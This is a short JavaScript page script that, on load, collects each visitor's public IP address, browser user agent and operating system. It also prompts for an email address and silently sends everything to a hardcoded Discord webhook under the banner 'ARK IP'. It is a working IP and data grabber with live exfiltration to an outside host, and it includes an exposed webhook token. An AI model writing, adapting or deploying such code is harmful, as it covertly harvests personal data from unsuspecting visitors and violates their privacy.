window.onload = function () {
  fetch('https://api64.ipify.org?format=json')
      .then(res => res.json())
      .then(data => {
          const ip = data.ip;
          const device = navigator.userAgent;
          const platform = navigator.platform;
          const email = prompt("Enter your email to continue:");

          const webhookURL = "https://discord.com/api/webhooks/1362658452266287125/dZIoJad_qKV4tBtOm8YXOU6jcCCGbNCj9ccfsUWwDXc_jGQAI9_I0oVyiVB4QZPaZOFG";

          const embedData = {
              "username": "ARK IP",
              "avatar_url": "https://cdn.discordapp.com/icons/123456789012345678/yourimage.png",
              "embeds": [{
                  "title": "📌 **ARK IP**",
                  "color": 16711680,
                  "fields": [
                      { "name": "🔹 **IP Address**", "value": `\`${ip}\``, "inline": false },
                      { "name": "📱 **Device**", "value": `\`${device}\``, "inline": false },
                      { "name": "💻 **Platform (OS)**", "value": `\`${platform}\``, "inline": false },
                      { "name": "📧 **Gmail**", "value": `\`${email || "Not provided"}\``, "inline": false }
                  ],
                  "footer": { "text": "ARK ON TOP" }
              }]
          };

          fetch(webhookURL, {
              method: 'POST',
              headers: {
                  'Content-Type': 'application/json'
              },
              body: JSON.stringify(embedData)
          });
      })
      .catch(err => console.error('Error:', err));
};
